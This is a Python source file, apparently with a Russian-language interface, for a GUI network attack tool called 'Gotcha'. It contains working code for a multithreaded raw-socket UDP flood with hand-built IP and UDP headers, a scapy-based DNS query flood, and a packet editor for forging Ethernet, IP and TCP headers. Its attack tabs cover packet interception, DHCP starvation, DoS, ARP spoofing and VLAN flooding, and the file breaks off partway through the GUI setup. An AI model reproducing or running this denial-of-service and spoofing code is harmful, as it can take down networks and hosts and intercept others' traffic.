import tkinter as tk
from tkinter import *
from tkinter import ttk, scrolledtext, messagebox, filedialog
import threading
import time
import subprocess
import queue
import socket
import struct
import random
import os
import psutil
import platform
import ctypes
import sys
import json
from scapy.all import *
from scapy.layers.dhcp import DHCP, BOOTP
from scapy.layers.l2 import ARP, Ether, Dot1Q
from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.layers.dns import DNS, DNSQR

def find_exe(exe_name):
    """
    Ищет исполняемый файл в нескольких стандартных местах:
    1. В папке exe/ рядом с исполняемым файлом (или скриптом)
    2. В той же папке, что и исполняемый файл (или скрипт)
    3. В папке exe/ в текущем рабочем каталоге
    4. В текущем рабочем каталоге
    Возвращает полный путь, если файл найден, иначе None.
    """
    if getattr(sys, 'frozen', False):
        base_dir = os.path.dirname(sys.executable)
    else:
        base_dir = os.path.dirname(os.path.abspath(__file__))
    
    search_paths = [
        os.path.join(base_dir, "exe", exe_name),
        os.path.join(base_dir, exe_name),
        os.path.join(os.getcwd(), "exe", exe_name),
        os.path.join(os.getcwd(), exe_name),
    ]
    
    for path in search_paths:
        if os.path.isfile(path):
            return path
    return None

class RSattack:
    def __init__(self):
        self.running = False
        self.threads = []
        self.stats_lock = threading.Lock()
        self.stats = {
            'total_sent': 0,
            'current_pps': 0,
            'start_time': 0,
            'total_bytes': 0,
            'last_update': 0
        }
        self.udp_data_cache = {}
        self._monitor_lock = threading.Lock()
        self._completion_notified = False
        
    def start_udp_attack(self, target_ip, port, packet_size, duration, continuous, interface, app_log, on_complete=None):
        self.running = True
        self._completion_notified = False
        self.stats = {
            'total_sent': 0,
            'current_pps': 0,
            'start_time': time.time(),
            'total_bytes': 0,
            'last_update': time.time()
        }
        
        try:
            source_ip = get_if_addr(interface)
            if not source_ip or source_ip == '0.0.0.0':
                source_ip = "192.168.1.1"
        except:
            source_ip = "192.168.1.1"
        
        data_size = max(0, packet_size - 28)
        cache_key = f"{packet_size}_{port}"
        
        if cache_key not in self.udp_data_cache:
            self.udp_data_cache[cache_key] = {
                'data': os.urandom(data_size),
                'pseudo_header': self._create_udp_pseudo_header(source_ip, target_ip, port, data_size)
            }
        
        cached = self.udp_data_cache[cache_key]
        data = cached['data']
        pseudo_header_template = cached['pseudo_header']
        total_length = 28 + data_size
        
        if platform.system() == "Windows":
            num_threads = 8
        else:
            num_threads = 16
        
        app_log(f"UDP flood: {num_threads} threads, packet size {packet_size} bytes")
        app_log(f"Target: {target_ip}:{port}")
        app_log(f"Interface: {interface} (src_ip: {source_ip})")
        
        worker_threads = []
        for i in range(num_threads):
            thread = threading.Thread(
                target=self._udp_raw_worker,
                args=(i, target_ip, port, total_length, duration, continuous, 
                      interface, source_ip, data, pseudo_header_template, app_log),
                daemon=True
            )
            thread.start()
            self.threads.append(thread)
            worker_threads.append(thread)
        
        stats_thread = threading.Thread(target=self._stats_worker, daemon=True)
        stats_thread.start()
        self.threads.append(stats_thread)

        monitor_thread = threading.Thread(
            target=self._monitor_udp_workers,
            args=(worker_threads, on_complete),
            daemon=True
        )
        monitor_thread.start()
        self.threads.append(monitor_thread)
        
        return True

    def _monitor_udp_workers(self, worker_threads, on_complete=None):
        for thread in worker_threads:
            thread.join()

        with self._monitor_lock:
            should_notify = self.running and not self._completion_notified
            self.running = False
            if should_notify:
                self._completion_notified = True

        if should_notify and on_complete:
            on_complete()
    
    def _udp_raw_worker(self, thread_id, target_ip, port, total_length, total_seconds, 
                        continuous, interface, source_ip, data, pseudo_header_template, app_log):
        packets_sent = 0
        src_port_base = (thread_id * 1000) + 1024
        start_time = time.time()
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2 * 1024 * 1024)
            
            batch_size = 200
            
            while self.running and (continuous or (time.time() - start_time) < total_seconds):
                batch_packets = []
                
                for i in range(batch_size):
                    if not continuous and (time.time() - start_time) >= total_seconds:
                        break
                    
                    packet = self._create_udp_packet(
                        source_ip, target_ip, port,
                        total_length,
                        packets_sent,
                        src_port_base + (packets_sent % 1000),
                        data,
                        pseudo_header_template
                    )
                    batch_packets.append(packet)
                    packets_sent += 1
                
                try:
                    for packet in batch_packets:
                        sock.sendto(packet, (target_ip, 0))
                    
                    with self.stats_lock:
                        self.stats['total_sent'] += len(batch_packets)
                        self.stats['total_bytes'] += sum(len(p) for p in batch_packets)
                        
                except Exception as e:
                    time.sleep(0.005)
                
                if packets_sent % 10000 == 0:
                    time.sleep(0.0005)
            
            sock.close()
            
        except Exception as e:
            app_log(f"[UDP-{thread_id}] Error: {str(e)[:80]}")
    
    def _create_udp_pseudo_header(self, src_ip, dst_ip, dst_port, data_size):
        return struct.pack('!4s4sBBH',
            socket.inet_aton(src_ip),
            socket.inet_aton(dst_ip),
            0, 17,
            8 + data_size)
    
    def _create_udp_packet(self, src_ip, dst_ip, dst_port, total_length, seq_num, src_port, data, pseudo_header_template):
        ip_header = struct.pack('!BBHHHBBH4s4s',
            0x45, 0x00,
            total_length,
            (seq_num >> 16) & 0xFFFF,
            0x4000,
            64, 17, 0,
            socket.inet_aton(src_ip),
            socket.inet_aton(dst_ip)
        )
        
        udp_header = struct.pack('!HHHH',
            src_port, dst_port,
            8 + len(data), 0
        )
        
        udp_checksum = self._calculate_checksum_fast(pseudo_header_template + udp_header + data)
        udp_header = udp_header[:6] + struct.pack('H', udp_checksum)
        
        ip_checksum = self._calculate_checksum_fast(ip_header)
        ip_header = ip_header[:10] + struct.pack('H', ip_checksum) + ip_header[12:]
        
        return ip_header + udp_header + data
    
    def _calculate_checksum_fast(self, data):
        if len(data) % 2:
            data += b'\x00'
        
        s = 0
        mv = memoryview(data)
        for i in range(0, len(mv), 2):
            w = (mv[i] << 8) + mv[i+1]
            s += w
        
        s = (s & 0xffff) + (s >> 16)
        s = (s & 0xffff) + (s >> 16)
        
        return ~s & 0xffff
    
    def _stats_worker(self):
        last_time = time.time()
        last_count = 0
        
        while self.running:
            time.sleep(0.5)
            
            current_time = time.time()
            with self.stats_lock:
                current_count = self.stats['total_sent']
                
                time_diff = current_time - last_time
                if time_diff > 0:
                    pps = int((current_count - last_count) / time_diff)
                    self.stats['current_pps'] = pps
                
                last_time = current_time
                last_count = current_count
    
    def stop(self):
        self.running = False
        for thread in self.threads:
            if thread.is_alive():
                thread.join(timeout=0.5)
        self.threads.clear()
        return self.stats.copy()

class Sattack:
    def __init__(self):
        self.running = False
        self.threads = []
        self.stats_lock = threading.Lock()
        self.stats = {
            'total_sent': 0,
            'start_time': 0,
            'total_bytes': 0
        }
        self._monitor_lock = threading.Lock()
        self._completion_notified = False
    
    def start_dns_attack(self, target_ip, duration, continuous, interface, app_log, on_complete=None):
        self.running = True
        self._completion_notified = False
        self.stats = {
            'total_sent': 0,
            'start_time': time.time(),
            'total_bytes': 0
        }
        
        num_threads = min(4, os.cpu_count() or 2)
        app_log(f"DNS flood: {num_threads} threads")
        app_log(f"Target: {target_ip}:53")
        app_log(f"Interface: {interface}")
        
        worker_threads = []
        for i in range(num_threads):
            thread = threading.Thread(
                target=self._dns_scapy_worker,
                args=(i, target_ip, duration, continuous, interface, app_log),
                daemon=True
            )
            thread.start()
            self.threads.append(thread)
            worker_threads.append(thread)

        monitor_thread = threading.Thread(
            target=self._monitor_dns_workers,
            args=(worker_threads, on_complete),
            daemon=True
        )
        monitor_thread.start()
        self.threads.append(monitor_thread)
        
        return True

    def _monitor_dns_workers(self, worker_threads, on_complete=None):
        for thread in worker_threads:
            thread.join()

        with self._monitor_lock:
            should_notify = self.running and not self._completion_notified
            self.running = False
            if should_notify:
                self._completion_notified = True

        if should_notify and on_complete:
            on_complete()
    
    def _dns_scapy_worker(self, thread_id, target_ip, total_seconds, continuous, interface, app_log):
        sent = 0
        domains = ["example.com", "google.com", "yandex.ru", "mail.ru", "github.com"]
        start_time = time.time()
        
        while self.running and (continuous or (time.time() - start_time) < total_seconds):
            try:
                packet = IP(dst=target_ip)/UDP(
                    sport=random.randint(1024, 65535),
                    dport=53
                )/DNS(
                    rd=1,
                    qd=DNSQR(qname=random.choice(domains))
                )
                
                send(packet, verbose=0)
                sent += 1
                
                with self.stats_lock:
                    self.stats['total_sent'] += 1
                    self.stats['total_bytes'] += len(packet)
                    
            except Exception as e:
                app_log(f"[DNS-{thread_id}] Error: {str(e)[:80]}")
                time.sleep(0.1)
    
    def stop(self):
        self.running = False
        for thread in self.threads:
            if thread.is_alive():
                thread.join(timeout=0.5)
        self.threads.clear()
        return self.stats.copy()

class Theme:
    DEFAULT_FONT = ('Segoe UI', 10)
    MONO_FONT = ('Consolas', 9)

    def __init__(self, root):
        self.root = root
        self.current_theme = "dark"
        self.style = ttk.Style()
        self.setup_themes()

    def setup_themes(self):
        self.themes = {
            "light": {
                "window_bg": "#f1f5f9",
                "primary_bg": "#e2e8f0",
                "secondary_bg": "#ffffff",
                "primary_fg": "#0f172a",
                "secondary_fg": "#475569",
                "accent": "#2563eb",
                "accent_hover": "#1d4ed8",
                "border": "#cbd5e1",
                "input_bg": "#ffffff",
                "input_fg": "#0f172a",
                "button_bg": "#334155",
                "button_fg": "#ffffff",
                "tree_bg": "#ffffff",
                "tree_fg": "#0f172a",
                "tree_selected": "#dbeafe",
                "text_bg": "#ffffff",
                "text_fg": "#0f172a",
                "scrollbar_bg": "#cbd5e1",
                "scrollbar_trough": "#e2e8f0",
                "scrollbar_arrow": "#475569",
                "header_bg": "#f8fafc",
                "header_fg": "#334155",
                "field_focus": "#bfdbfe"
            },
            "dark": {
                "window_bg": "#111111",
                "primary_bg": "#1B1B1E",
                "secondary_bg": "#232326",
                "primary_fg": "#FFFFFF",
                "secondary_fg": "#C2BFBB",
                "accent": "#798086",
                "accent_hover": "#8a9197",
                "border": "#353535",
                "input_bg": "#202023",
                "input_fg": "#FFFFFF",
                "button_bg": "#353535",
                "button_fg": "#FFFFFF",
                "tree_bg": "#1B1B1E",
                "tree_fg": "#FFFFFF",
                "tree_selected": "#4a4f55",
                "text_bg": "#202023",
                "text_fg": "#FFFFFF",
                "scrollbar_bg": "#444444",
                "scrollbar_trough": "#1B1B1E",
                "scrollbar_arrow": "#C2BFBB",
                "header_bg": "#2A2A2D",
                "header_fg": "#FFFFFF",
                "field_focus": "#3f4348"
            }
        }

    def apply_theme(self, theme_name):
        if theme_name not in self.themes:
            return

        self.current_theme = theme_name
        theme = self.themes[theme_name]

        self.style.theme_use('clam')

        self.style.configure('.',
                             background=theme['primary_bg'],
                             foreground=theme['primary_fg'],
                             fieldbackground=theme['input_bg'],
                             selectbackground=theme['accent'],
                             bordercolor=theme['border'],
                             lightcolor=theme['border'],
                             darkcolor=theme['border'],
                             font=self.DEFAULT_FONT)

        self.root.configure(bg=theme['window_bg'])
        self.root.tk_setPalette(
            background=theme['window_bg'],
            foreground=theme['primary_fg'],
            activeBackground=theme['accent'],
            activeForeground=theme['button_fg']
        )

        self.style.configure('TFrame', background=theme['primary_bg'])
        self.style.configure('TLabel',
                             background=theme['primary_bg'],
                             foreground=theme['primary_fg'],
                             font=self.DEFAULT_FONT)

        self.style.configure('TLabelframe',
                             background=theme['secondary_bg'],
                             foreground=theme['primary_fg'],
                             bordercolor=theme['border'],
                             relief='solid')
        self.style.configure('TLabelframe.Label',
                             background=theme['secondary_bg'],
                             foreground=theme['header_fg'],
                             font=('Segoe UI Semibold', 10))

        self.style.configure('TButton',
                             background=theme['button_bg'],
                             foreground=theme['button_fg'],
                             borderwidth=1,
                             relief='flat',
                             focuscolor=theme['accent'],
                             padding=(8, 4),
                             font=('Segoe UI Semibold', 9),
                             wraplength=150)
        self.style.map('TButton',
                       background=[('active', theme['accent_hover']), ('pressed', theme['accent'])],
                       foreground=[('disabled', theme['secondary_fg'])],
                       relief=[('pressed', 'sunken')])

        self.style.configure('TEntry',
                             fieldbackground=theme['input_bg'],
                             foreground=theme['input_fg'],
                             insertcolor=theme['input_fg'],
                             bordercolor=theme['border'],
                             lightcolor=theme['border'],
                             darkcolor=theme['border'],
                             font=self.DEFAULT_FONT)
        self.style.map('TEntry',
                       fieldbackground=[('focus', theme['field_focus'])],
                       foreground=[('disabled', theme['secondary_fg'])])

        self.style.configure('TCombobox',
                             fieldbackground=theme['input_bg'],
                             foreground=theme['input_fg'],
                             background=theme['button_bg'],
                             arrowcolor=theme['secondary_fg'],
                             bordercolor=theme['border'],
                             lightcolor=theme['border'],
                             darkcolor=theme['border'],
                             font=self.DEFAULT_FONT)

        self.style.configure('TCheckbutton',
                             background=theme['primary_bg'],
                             foreground=theme['primary_fg'],
                             focuscolor=theme['accent'])

        self.style.configure('TNotebook',
                             background=theme['secondary_bg'],
                             bordercolor=theme['border'])
        self.style.configure('TNotebook.Tab',
                             background=theme['header_bg'],
                             foreground=theme['secondary_fg'],
                             padding=(12, 6),
                             font=('Segoe UI', 9))
        self.style.map('TNotebook.Tab',
                       background=[('selected', theme['primary_bg']), ('active', theme['secondary_bg'])],
                       foreground=[('selected', theme['primary_fg']), ('active', theme['primary_fg'])])

        self.style.configure('Treeview',
                             background=theme['tree_bg'],
                             foreground=theme['tree_fg'],
                             fieldbackground=theme['tree_bg'],
                             bordercolor=theme['border'],
                             rowheight=22,
                             font=self.DEFAULT_FONT)
        self.style.configure('Treeview.Heading',
                             background=theme['header_bg'],
                             foreground=theme['header_fg'],
                             relief='flat',
                             font=('Segoe UI Semibold', 9))
        self.style.map('Treeview',
                       background=[('selected', theme['tree_selected'])],
                       foreground=[('selected', theme['primary_fg'])])
        self.style.map('Treeview.Heading',
                       background=[('active', theme['secondary_bg'])])

        self.style.configure('TScrollbar',
                             background=theme['scrollbar_bg'],
                             troughcolor=theme['scrollbar_trough'],
                             arrowcolor=theme['scrollbar_arrow'])

        self.apply_to_widgets(self.root, theme)

    def apply_to_widgets(self, widget, theme):
        widget_stack = [widget]
        while widget_stack:
            current = widget_stack.pop()
            try:
                widget_type = current.winfo_class()

                if widget_type in ('Frame', 'Labelframe', 'LabelFrame'):
                    current.config(bg=theme['primary_bg'], highlightbackground=theme['border'])
                elif widget_type == 'Label':
                    current.config(bg=theme['primary_bg'], fg=theme['primary_fg'], font=self.DEFAULT_FONT)
                elif widget_type == 'Button':
                    current.config(bg=theme['button_bg'], fg=theme['button_fg'],
                                   activebackground=theme['accent_hover'], activeforeground=theme['button_fg'],
                                   font=('Segoe UI Semibold', 9), padx=8, pady=3, wraplength=150,
                                   relief='flat', bd=1)
                elif widget_type == 'Entry':
                    current.config(bg=theme['input_bg'], fg=theme['input_fg'],
                                   insertbackground=theme['input_fg'], font=self.DEFAULT_FONT,
                                   relief='flat', highlightthickness=1,
                                   highlightbackground=theme['border'], highlightcolor=theme['accent'])
                elif widget_type == 'Text':
                    current.config(bg=theme['text_bg'], fg=theme['text_fg'],
                                   insertbackground=theme['text_fg'], selectbackground=theme['accent'],
                                   selectforeground=theme['button_fg'], font=self.MONO_FONT,
                                   relief='flat', highlightthickness=1,
                                   highlightbackground=theme['border'], highlightcolor=theme['accent'])
                elif widget_type == 'Scrollbar':
                    current.config(bg=theme['scrollbar_bg'], troughcolor=theme['scrollbar_trough'],
                                   activebackground=theme['scrollbar_bg'])
                elif widget_type == 'Listbox':
                    current.config(bg=theme['input_bg'], fg=theme['input_fg'],
                                   selectbackground=theme['accent'], selectforeground=theme['button_fg'],
                                   font=self.DEFAULT_FONT)
                elif widget_type == 'Canvas':
                    current.config(bg=theme['primary_bg'], highlightbackground=theme['border'])
            except tk.TclError:
                pass

            widget_stack.extend(current.winfo_children())

class Editor:
    def __init__(self, parent, packet, callback):
        self.parent = parent
        self.packet = packet
        self.callback = callback
        self.edited_packet = None
        
        self.editor_window = tk.Toplevel(parent)
        self.editor_window.title("Редактор пакета")
        self.editor_window.geometry("1000x800")
        self.editor_window.transient(parent)
        self.editor_window.grab_set()
        
        try:
            self.editor_window.iconbitmap("other/images.ico")
        except:
            pass
        
        self.create_widgets()
        self.parse_packet()
        
    def create_widgets(self):
        main_frame = ttk.Frame(self.editor_window)
        main_frame.pack(fill='both', expand=True, padx=10, pady=10)

        info_frame = ttk.LabelFrame(main_frame, text="Информация о пакете")
        info_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(info_frame, text="Исходный пакет:").grid(row=0, column=0, padx=5, pady=2, sticky='w')
        self.original_info = ttk.Label(info_frame, text=self.packet.summary())
        self.original_info.grid(row=0, column=1, padx=5, pady=2, sticky='w')

        details_frame = ttk.LabelFrame(main_frame, text="Детали пакета")
        details_frame.pack(fill='x', padx=5, pady=5)
        
        self.packet_details = scrolledtext.ScrolledText(details_frame, height=8, wrap=tk.WORD)
        self.packet_details.pack(fill='both', expand=True, padx=5, pady=5)
        self.packet_details.config(state='normal')
        
        eth_frame = ttk.LabelFrame(main_frame, text="Ethernet Layer")
        eth_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(eth_frame, text="Source MAC:").grid(row=0, column=0, padx=5, pady=2, sticky='w')
        self.eth_src = ttk.Entry(eth_frame, width=20)
        self.eth_src.grid(row=0, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(eth_frame, text="Dest MAC:").grid(row=0, column=2, padx=5, pady=2, sticky='w')
        self.eth_dst = ttk.Entry(eth_frame, width=20)
        self.eth_dst.grid(row=0, column=3, padx=5, pady=2, sticky='w')

        ip_frame = ttk.LabelFrame(main_frame, text="IP Layer")
        ip_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(ip_frame, text="Source IP:").grid(row=0, column=0, padx=5, pady=2, sticky='w')
        self.ip_src = ttk.Entry(ip_frame, width=20)
        self.ip_src.grid(row=0, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(ip_frame, text="Dest IP:").grid(row=0, column=2, padx=5, pady=2, sticky='w')
        self.ip_dst = ttk.Entry(ip_frame, width=20)
        self.ip_dst.grid(row=0, column=3, padx=5, pady=2, sticky='w')
        
        ttk.Label(ip_frame, text="TTL:").grid(row=1, column=0, padx=5, pady=2, sticky='w')
        self.ip_ttl = ttk.Entry(ip_frame, width=10)
        self.ip_ttl.grid(row=1, column=1, padx=5, pady=2, sticky='w')
        
        transport_frame = ttk.LabelFrame(main_frame, text="Transport Layer")
        transport_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(transport_frame, text="Protocol:").grid(row=0, column=0, padx=5, pady=2, sticky='w')
        self.transport_proto = ttk.Combobox(transport_frame, values=["TCP", "UDP", "ICMP", "RAW"], width=10)
        self.transport_proto.grid(row=0, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(transport_frame, text="Source Port:").grid(row=1, column=0, padx=5, pady=2, sticky='w')
        self.src_port = ttk.Entry(transport_frame, width=10)
        self.src_port.grid(row=1, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(transport_frame, text="Dest Port:").grid(row=1, column=2, padx=5, pady=2, sticky='w')
        self.dst_port = ttk.Entry(transport_frame, width=10)
        self.dst_port.grid(row=1, column=3, padx=5, pady=2, sticky='w')

        tcp_flags_frame = ttk.Frame(transport_frame)
        tcp_flags_frame.grid(row=2, column=0, columnspan=4, pady=5)
        
        self.tcp_flags_vars = {}
        tcp_flags = ["FIN", "SYN", "RST", "PSH", "ACK", "URG", "ECE", "CWR"]
        for i, flag in enumerate(tcp_flags):
            self.tcp_flags_vars[flag] = tk.BooleanVar()
            ttk.Checkbutton(tcp_flags_frame, text=flag, variable=self.tcp_flags_vars[flag]).grid(
                row=0, column=i, padx=2, sticky='w')

        data_frame = ttk.LabelFrame(main_frame, text="Payload Data")
        data_frame.pack(fill='both', expand=True, padx=5, pady=5)
        
        self.payload_data = scrolledtext.ScrolledText(data_frame, height=10, wrap=tk.WORD)
        self.payload_data.pack(fill='both', expand=True, padx=5, pady=5)

        button_frame = ttk.Frame(main_frame)
        button_frame.pack(fill='x', padx=5, pady=10)
        
        ttk.Button(button_frame, text="Применить изменения", 
                  command=self.apply_changes).pack(side='left', padx=5)
        ttk.Button(button_frame, text="Отмена", 
                  command=self.editor_window.destroy).pack(side='right', padx=5)
        
    def parse_packet(self):
        if self.packet.haslayer(Ether):
            self.eth_src.insert(0, self.packet[Ether].src)
            self.eth_dst.insert(0, self.packet[Ether].dst)
        
        if self.packet.haslayer(IP):
            self.ip_src.insert(0, self.packet[IP].src)
            self.ip_dst.insert(0, self.packet[IP].dst)
            self.ip_ttl.insert(0, str(self.packet[IP].ttl))
            
            if self.packet.haslayer(TCP):
                self.transport_proto.set("TCP")
                self.src_port.insert(0, str(self.packet[TCP].sport))
                self.dst_port.insert(0, str(self.packet[TCP].dport))

                flags = self.packet[TCP].flags
                self.tcp_flags_vars["FIN"].set(bool(flags & 0x01))
                self.tcp_flags_vars["SYN"].set(bool(flags & 0x02))
                self.tcp_flags_vars["RST"].set(bool(flags & 0x04))
                self.tcp_flags_vars["PSH"].set(bool(flags & 0x08))
                self.tcp_flags_vars["ACK"].set(bool(flags & 0x10))
                self.tcp_flags_vars["URG"].set(bool(flags & 0x20))
                self.tcp_flags_vars["ECE"].set(bool(flags & 0x40))
                self.tcp_flags_vars["CWR"].set(bool(flags & 0x80))
                
                if self.packet.haslayer(Raw):
                    try:
                        self.payload_data.insert('1.0', self.packet[Raw].load.hex())
                    except:
                        self.payload_data.insert('1.0', str(self.packet[Raw].load))
                    
            elif self.packet.haslayer(UDP):
                self.transport_proto.set("UDP")
                self.src_port.insert(0, str(self.packet[UDP].sport))
                self.dst_port.insert(0, str(self.packet[UDP].dport))
                
                if self.packet.haslayer(Raw):
                    try:
                        self.payload_data.insert('1.0', self.packet[Raw].load.hex())
                    except:
                        self.payload_data.insert('1.0', str(self.packet[Raw].load))
                    
            elif self.packet.haslayer(ICMP):
                self.transport_proto.set("ICMP")
            else:
                self.transport_proto.set("RAW")

        self.show_packet_details()
                
    def show_packet_details(self):
        details = "=== ДЕТАЛИ ПАКЕТА ===\n\n"
        
        if self.packet.haslayer(Ether):
            details += f"Ethernet:\n"
            details += f"  Source: {self.packet[Ether].src}\n"
            details += f"  Destination: {self.packet[Ether].dst}\n"
            details += f"  Type: {self.packet[Ether].type}\n\n"
        
        if self.packet.haslayer(IP):
            details += f"IP:\n"
            details += f"  Version: {self.packet[IP].version}\n"
            details += f"  Source: {self.packet[IP].src}\n"
            details += f"  Destination: {self.packet[IP].dst}\n"
            details += f"  TTL: {self.packet[IP].ttl}\n"
            details += f"  Protocol: {self.packet[IP].proto}\n\n"
            
        if self.packet.haslayer(TCP):
            details += f"TCP:\n"
            details += f"  Source Port: {self.packet[TCP].sport}\n"
            details += f"  Destination Port: {self.packet[TCP].dport}\n"
            details += f"  Flags: {self.packet[TCP].flags}\n"
            details += f"  Sequence: {self.packet[TCP].seq}\n"
            details += f"  Acknowledgment: {self.packet[TCP].ack}\n"
            details += f"  Window: {self.packet[TCP].window}\n\n"
            
        elif self.packet.haslayer(UDP):
            details += f"UDP:\n"
            details += f"  Source Port: {self.packet[UDP].sport}\n"
            details += f"  Destination Port: {self.packet[UDP].dport}\n"
            details += f"  Length: {self.packet[UDP].len}\n\n"
            
        elif self.packet.haslayer(ICMP):
            details += f"ICMP:\n"
            details += f"  Type: {self.packet[ICMP].type}\n"
            details += f"  Code: {self.packet[ICMP].code}\n\n"
            
        if self.packet.haslayer(Raw):
            details += f"Payload:\n"
            payload = self.packet[Raw].load
            details += f"  Length: {len(payload)} bytes\n"
            try:
                details += f"  Hex: {payload.hex()}\n"
                if len(payload) < 100:
                    try:
                        text = payload.decode('utf-8', errors='ignore')
                        if all(c.isprintable() or c in '\n\r\t' for c in text):
                            details += f"  Text: {text}\n"
                    except:
                        pass
            except:
                details += f"  Content: {str(payload)}\n"
        
        self.packet_details.insert('1.0', details)
        self.packet_details.config(state='disabled')
                
    def apply_changes(self):
        try:
            new_packet = self.create_modified_packet()
            self.edited_packet = new_packet
            self.callback(new_packet, True)
            self.editor_window.destroy()
            
        except Exception as e:
            messagebox.showerror("Ошибка", f"Не удалось создать пакет: {str(e)}")
    
    def create_modified_packet(self):
        new_packet = Ether()

        if self.eth_src.get():
            dst_mac = self.eth_dst.get() if self.eth_dst.get() else "ff:ff:ff:ff:ff:ff"
            new_packet = Ether(src=self.eth_src.get(), dst=dst_mac)

        if self.ip_src.get() and self.ip_dst.get():
            ip_packet = IP(src=self.ip_src.get(), dst=self.ip_dst.get())
            if self.ip_ttl.get():
                try:
                    ip_packet.ttl = int(self.ip_ttl.get())
                except:
                    pass
                    
            new_packet = new_packet / ip_packet

            proto = self.transport_proto.get()
            if proto == "TCP" and self.src_port.get() and self.dst_port.get():
                tcp_packet = TCP(sport=int(self.src_port.get()), dport=int(self.dst_port.get()))

                flags = 0
                if self.tcp_flags_vars["FIN"].get(): flags |= 0x01
                if self.tcp_flags_vars["SYN"].get(): flags |= 0x02
                if self.tcp_flags_vars["RST"].get(): flags |= 0x04
                if self.tcp_flags_vars["PSH"].get(): flags |= 0x08
                if self.tcp_flags_vars["ACK"].get(): flags |= 0x10
                if self.tcp_flags_vars["URG"].get(): flags |= 0x20
                if self.tcp_flags_vars["ECE"].get(): flags |= 0x40
                if self.tcp_flags_vars["CWR"].get(): flags |= 0x80
                
                tcp_packet.flags = flags
                new_packet = new_packet / tcp_packet
                
            elif proto == "UDP" and self.src_port.get() and self.dst_port.get():
                new_packet = new_packet / UDP(sport=int(self.src_port.get()), dport=int(self.dst_port.get()))
                
            elif proto == "ICMP":
                new_packet = new_packet / ICMP()
            
            payload_text = self.payload_data.get('1.0', 'end').strip()
            if payload_text:
                try:
                    payload_bytes = bytes.fromhex(payload_text.replace(' ', '').replace('\n', ''))
                    new_packet = new_packet / Raw(load=payload_bytes)
                except:
                    new_packet = new_packet / Raw(load=payload_text.encode())
        
        return new_packet

class Gotcha:
    def __init__(self, root):
        self.root = root
        self.root.title("Gotcha")
        self.root.geometry("1000x700")
        
        try:
            root.iconbitmap("other/images.ico")
        except:
            pass
        
        self.theme_manager = Theme(self.root)
        
        # Флаги состояния
        self.custom_stop_event = None
        self.custom_external_thread = None
        self.current_external_process = None
        self.sniffing_running = False
        self.dhcp_attack_running = False
        self.arp_spoof_running = False
        self.custom_attack_running = False
        self.packet_intercept_running = False
        self.vlan_attack_running = False
        self.current_attack_type = None  # 'udp', 'dns', 'tcp', 'arp', 'icmp'
        self.external_infinite = False    # флаг бесконечного режима для внешнего процесса
        self.vlan_attack_running = False
        self.vlan_stop_event = None
        self.vlan_external_thread = None
        self.vlan_stats = {
            'start_time': 0,
            'sent_frames': 0,
            'last_update': 0,
            'last_sent': 0
        }
        # Данные пакетов
        self.captured_packet = None
        self.selected_packet = None
        self.intercept_packets = []
        self.edited_packet = None
        
        # Потоки
        self.sniff_thread = None
        self.dhcp_thread = None
        self.arp_spoof_thread = None
        self.custom_attack_threads = []
        self.intercept_thread = None
        self.vlan_thread = None
        
        # Движки атак
        self.raw_attack = RSattack()
        self.scapy_attack = Sattack()
        
        # Сетевые интерфейсы
        self.network_interfaces = self.get_interface_list()
        
        # Настройка GUI
        self.setup_gui()
        self.theme_manager.apply_theme("dark")
        
        # Мониторинг системы
        self.system_monitor_running = True
        self.setup_system_monitor()
    
    def setup_system_monitor(self):
        self.update_system_monitor()
    
    def update_system_monitor(self):
        try:
            cpu_percent = psutil.cpu_percent(interval=None)
            memory = psutil.virtual_memory()
            ram_percent = memory.percent
            
            self.cpu_label.config(text=f"CPU: {cpu_percent:.1f}%")
            self.ram_label.config(text=f"RAM: {ram_percent:.1f}%")
        except:
            self.cpu_label.config(text="CPU: N/A")
            self.ram_label.config(text="RAM: N/A")
        
        if self.system_monitor_running:
            self.root.after(1000, self.update_system_monitor)
    
    def get_interface_list(self):
        interfaces = []
        try:
            iface_list = get_if_list()
            for iface in iface_list:
                interfaces.append(iface)
        except:
            pass
        
        if not interfaces:
            interfaces = ["Ethernet", "Wi-Fi", "eth0", "wlan0"]
        
        return interfaces
    
    def setup_gui(self):
        main_notebook = ttk.Notebook(self.root)
        main_notebook.pack(fill='both', expand=True, padx=8, pady=8)
        
        auxiliary_frame = ttk.Frame(main_notebook)
        main_notebook.add(auxiliary_frame, text="Вспомогательное")
        
        auxiliary_notebook = ttk.Notebook(auxiliary_frame)
        auxiliary_notebook.pack(fill='both', expand=True, padx=8, pady=8)
        
        access_frame = ttk.Frame(auxiliary_notebook)
        auxiliary_notebook.add(access_frame, text="Доступ")
        self.setup_access_tab(access_frame)
        
        settings_frame = ttk.Frame(auxiliary_notebook)
        auxiliary_notebook.add(settings_frame, text="Настройки")
        self.setup_settings_tab(settings_frame)
        
        attacks_frame = ttk.Frame(main_notebook)
        main_notebook.add(attacks_frame, text="Атаки")
        
        attacks_notebook = ttk.Notebook(attacks_frame)
        attacks_notebook.pack(fill='both', expand=True, padx=8, pady=8)
        
        intercept_frame = ttk.Frame(attacks_notebook)
        attacks_notebook.add(intercept_frame, text="Перехват пакетов")
        self.setup_intercept_tab(intercept_frame)
        
        dhcp_frame = ttk.Frame(attacks_notebook)
        attacks_notebook.add(dhcp_frame, text="DHCP Starvation")
        self.setup_dhcp_tab(dhcp_frame)
        
        custom_frame = ttk.Frame(attacks_notebook)
        attacks_notebook.add(custom_frame, text="DoS атака")
        self.setup_custom_attack_tab(custom_frame)
        
        arp_spoof_frame = ttk.Frame(attacks_notebook)
        attacks_notebook.add(arp_spoof_frame, text="ARP Spoofing")
        self.setup_arp_spoof_tab(arp_spoof_frame)
        
        vlan_frame = ttk.Frame(attacks_notebook)
        attacks_notebook.add(vlan_frame, text="VLAN flood")
        self.setup_vlan_flood_tab(vlan_frame)
        
        self.status_var = tk.StringVar()
        self.status_var.set("Готов к работе")
        
